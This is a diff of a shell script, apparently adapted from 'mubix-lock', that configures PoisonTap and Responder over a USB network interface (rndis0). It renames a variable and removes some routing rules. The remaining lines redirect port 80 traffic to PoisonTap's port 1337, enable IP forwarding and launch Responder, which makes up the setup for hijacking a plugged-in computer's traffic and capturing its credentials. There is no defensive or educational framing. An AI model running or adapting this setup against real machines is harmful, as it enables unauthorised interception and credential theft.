@@ -2,7 +2,7 @@
 #
 # modified script form mubix-lock
 #
-rndis="rndis0" # Older devices use usb0!
+RNDIS="rndis0" # Older devices use usb0!
 POISON_TAP="/opt/poisontap" # Location of poisontap folder
 
 # ================== #
@@ -133,21 +133,8 @@ echo "[+] Wifi must be disabled.  Please disable if you have not yet."
 
 read -p "Press enter to continue..."
 
-# Fix this
-for table in $(ip rule list | awk -F"lookup" '{print $2}');
-do
-DEF=`ip route show table $table|grep default|grep $UPSTREAM`
-if ! [ -z "$DEF" ]; then
-   break
-fi
-done
-
-ip route add 1.0.0.0/24 dev $RNDIS scope link table $table
-ip route add default via 1.0.0.1 dev $RNDIS
-iptables -I FORWARD 1 -i $RNDIS -j ACCEPT
 iptables -t nat -A PREROUTING -i $RNDIS -p tcp --dport 80 -j REDIRECT --to-port 1337
-iptables -t nat -I POSTROUTING 1 -j MASQUERADE
-iptables -D natctrl_FORWARD -j DROP
+
 echo 1 > /proc/sys/net/ipv4/ip_forward
 
 echo "[+] Starting Responder on screen..."
